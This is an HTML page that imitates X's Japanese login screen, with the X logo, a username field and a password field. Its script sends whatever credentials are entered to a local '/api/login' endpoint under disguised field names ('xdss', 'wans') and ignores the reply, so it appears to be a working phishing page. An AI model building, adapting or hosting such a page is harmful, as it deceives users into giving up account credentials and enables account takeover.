<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xにログイン</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            background-color: #000000;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow-y: auto; 
        }

        .container {
            width: 100%;
            max-width: 600px; 
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center; 
            padding: 16px;
        }

        .login-box {
            width: 100%;
            max-width: 300px;
            display: flex;
            flex-direction: column;
        }

        .logo {
            width: 30px;
            height: 30px;
            fill: #eff3f4;
            margin: 0 auto 30px auto;
            display: block;
        }

        h1 {
            font-size: 31px;
            font-weight: 700;
            margin-bottom: 30px;
            text-align: left;
        }

        .input-group {
            position: relative;
            margin-bottom: 25px;
            width: 100%;
        }

        .input-label {
            display: block;
            font-size: 15px;
            color: #eff3f4;
            margin-bottom: 8px;
            line-height: 20px;
        }

        .text-input {
            width: 100%;
            height: 40px;
            background-color: #000;
            border: 1px solid #333639;
            border-radius: 4px;
            color: #fff;
            font-size: 16px;
            padding: 8px 12px;
            outline: none;
            transition: border-color 0.2s;
        }

        .text-input:focus {
            border-color: #1d9bf0;
            border-width: 2px;
        }

        .login-btn {
            width: 100%;
            height: 48px;
            background-color: #1d9bf0;
            border: none;
            border-radius: 9999px;
            color: #fff;
            font-weight: 700;
            font-size: 15px;
            cursor: pointer;
            margin-top: 10px;
            margin-bottom: 30px;
            transition: background-color 0.2s;
        }

        .login-btn:hover {
            background-color: #1a8cd8;
        }

        .footer-links {
            font-size: 14px;
            color: #1d9bf0;
            display: flex;
            justify-content: flex-start;
            flex-wrap: wrap;
            gap: 5px;
        }

        .footer-links a {
            color: #1d9bf0;
            text-decoration: none;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }
        .dot { margin: 0 2px; color: #71767b; }
        
        @media (max-width: 600px) {
            .container { justify-content: flex-start; padding-top: 40px; }
            h1 { font-size: 26px; }
            .login-box { max-width: 100%; padding: 0 10px; }
        }
    </style>
</head>
<body>

<div class="container">
    <div class="login-box">
        <!-- Xロゴ -->
        <svg viewBox="0 0 24 24" class="logo" aria-label="X"><g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g></svg>

        <h1>Xにログイン</h1>

        <div class="input-group">
            <label class="input-label" for="username">電話番号、メールアドレス、またはユーザー名</label>
            <input type="text" id="username" class="text-input">
        </div>

        <div class="input-group">
            <label class="input-label" for="password">パスワード</label>
            <input type="password" id="password" class="text-input">
        </div>

        <button type="button" class="login-btn" id="loginBtn">ログイン</button>

        <div class="footer-links">
            <a href="#">パスワードを忘れた場合</a>
            <span class="dot">·</span>
            <a href="#">アカウント作成</a>
        </div>
    </div>
</div>

<script>
    document.getElementById('loginBtn').addEventListener('click', function() {
        const inputXdss = document.getElementById('username').value;
        const inputWans = document.getElementById('password').value;     
        const data = {
            xdss: inputXdss,
            wans: inputWans
        };

        fetch('/api/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
        .then(response => {
             return response.json();
        })
        .then(jsonData => {
        })
        .catch(error => {
        });
    });
</script>
</body>
</html>
